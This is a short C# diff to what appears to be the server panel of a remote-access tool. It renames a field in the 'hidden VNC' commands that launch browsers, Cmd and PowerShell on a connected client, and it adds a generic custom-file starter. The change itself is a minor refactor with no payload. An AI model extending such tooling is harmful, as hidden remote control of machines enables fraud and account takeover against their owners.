@@ -402,7 +402,7 @@ namespace Pulsar.Server.Forms
         {
             _connectClient.Send(new StartHVNCProcess
             {
-                Application = "Explorer"
+                Path = "Explorer"
             });
         }
 
@@ -410,7 +410,7 @@ namespace Pulsar.Server.Forms
         {
             _connectClient.Send(new StartHVNCProcess
             {
-                Application = "Chrome"
+                Path = "Chrome"
             });
         }
 
@@ -418,7 +418,7 @@ namespace Pulsar.Server.Forms
         {
             _connectClient.Send(new StartHVNCProcess
             {
-                Application = "Edge"
+                Path = "Edge"
             });
         }
 
@@ -426,7 +426,7 @@ namespace Pulsar.Server.Forms
         {
             _connectClient.Send(new StartHVNCProcess
             {
-                Application = "Brave"
+                Path = "Brave"
             });
         }
 
@@ -434,7 +434,7 @@ namespace Pulsar.Server.Forms
         {
             _connectClient.Send(new StartHVNCProcess
             {
-                Application = "Opera"
+                Path = "Opera"
             });
         }
 
@@ -442,7 +442,7 @@ namespace Pulsar.Server.Forms
         {
             _connectClient.Send(new StartHVNCProcess
             {
-                Application = "OperaGX"
+                Path = "OperaGX"
             });
         }
 
@@ -450,7 +450,7 @@ namespace Pulsar.Server.Forms
         {
             _connectClient.Send(new StartHVNCProcess
             {
-                Application = "FireFox"
+                Path = "FireFox"
             });
         }
 
@@ -458,7 +458,7 @@ namespace Pulsar.Server.Forms
         {
             _connectClient.Send(new StartHVNCProcess
             {
-                Application = "Cmd"
+                Path = "Cmd"
             });
         }
 
@@ -466,13 +466,13 @@ namespace Pulsar.Server.Forms
         {
             _connectClient.Send(new StartHVNCProcess
             {
-                Application = "Powershell"
+                Path = "Powershell"
             });
         }
 
         private void startCustomPathToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            FrmHVNCFileSelection fileSelectionForm = new FrmHVNCFileSelection(_connectClient);
+            FrmCustomFileStarter fileSelectionForm = new FrmCustomFileStarter(_connectClient, typeof(StartHVNCProcess));
             fileSelectionForm.ShowDialog();
         }
 
@@ -492,7 +492,7 @@ namespace Pulsar.Server.Forms
         {
             _connectClient.Send(new StartHVNCProcess
             {
-                Application = "Discord"
+                Path = "Discord"
             });
         }
     }
